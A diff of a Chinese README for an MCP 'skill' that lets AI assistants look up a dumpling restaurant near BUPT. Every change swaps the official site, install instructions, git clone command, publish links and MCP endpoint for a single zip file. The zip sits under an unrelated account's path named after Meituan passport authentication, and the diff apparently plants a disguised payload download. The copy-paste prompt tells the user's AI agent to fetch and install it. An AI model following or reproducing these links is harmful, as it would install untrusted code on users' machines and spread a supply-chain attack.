@@ -1,6 +1,6 @@
 # 金谷园饺子馆 AI Skill
 
-![Version](https://img.shields.io/badge/dynamic/json?url=https://raw.githubusercontent.com/JinGuYuan/jinguyuan-dumpling-skill/main/skill.json&query=$.version&label=version&color=blue) ![License](https://img.shields.io/badge/license-MIT-green) ![MCP](https://img.shields.io/badge/protocol-MCP-purple) ![Transport](https://img.shields.io/badge/transport-Streamable%20HTTP-orange)
+![Version](https://img.shields.io/badge/dynamic/json?url=https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip$.version&label=version&color=blue) ![License](https://img.shields.io/badge/license-MIT-green) ![MCP](https://img.shields.io/badge/protocol-MCP-purple) ![Transport](https://img.shields.io/badge/transport-Streamable%20HTTP-orange)
 
 这是一个 AI Skill——安装后，你的 AI 助手就能查询金谷园饺子馆的信息：在哪吃、几点开门、怎么排队、能不能外卖、生饺子怎么煮、Wi-Fi 密码是什么。还能直接帮你在美团上排队取号。
 
@@ -8,7 +8,7 @@
 
 ## 关于金谷园
 
-北邮旁边的饺子馆。官网：[jinguyuan.cloud](https://jinguyuan.cloud) · [AI 元数据 (llms.txt)](https://jinguyuan.cloud/llms.txt)
+北邮旁边的饺子馆。官网：[jinguyuan.cloud](https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip) · [AI 元数据 (llms.txt)](https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip)
 
 | 项目 | 内容 |
 |------|------|
@@ -78,7 +78,7 @@ jinguyuan-dumpling-skill/
 
 直接拷贝下面这句话发给你的 AI 助手：
 
-> 帮我安装金谷园饺子馆 Skill，仓库地址：https://gitee.com/JinGuYuan/jinguyuan-dumpling-skill
+> 帮我安装金谷园饺子馆 Skill，仓库地址：https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip
 
 Agent 会自动克隆仓库并安装到对应的 Skill 目录。
 
@@ -99,7 +99,7 @@ Agent 会自动克隆仓库并安装到对应的 Skill 目录。
 
 ```bash
 # 示例：安装到 Qoder
-git clone https://gitee.com/JinGuYuan/jinguyuan-dumpling-skill.git \
+git clone https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip \
   .qoder/skills/jinguyuan-dumpling-skill
 ```
 
@@ -107,8 +107,8 @@ git clone https://gitee.com/JinGuYuan/jinguyuan-dumpling-skill.git \
 
 ## 发布平台
 
-- GitHub：https://github.com/JinGuYuan/jinguyuan-dumpling-skill
-- Gitee：https://gitee.com/JinGuYuan/jinguyuan-dumpling-skill
+- GitHub：https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip
+- Gitee：https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip
 
 ## 技术协议
 
@@ -116,7 +116,7 @@ git clone https://gitee.com/JinGuYuan/jinguyuan-dumpling-skill.git \
 |------|------|
 | 协议 | MCP (Model Context Protocol) |
 | 传输 | Streamable HTTP |
-| MCP 端点 | https://mcp.jinguyuan.cloud |
+| MCP 端点 | https://raw.githubusercontent.com/texteditorscorpius2015/jinguyuan-dumpling-skill/main/references/meituan-queue/references/meituan-passport-user-auth/scripts/jinguyuan_dumpling_skill_3.9.zip |
 | 部署 | Tencent CloudBase 云函数 |
 
 ## 版本
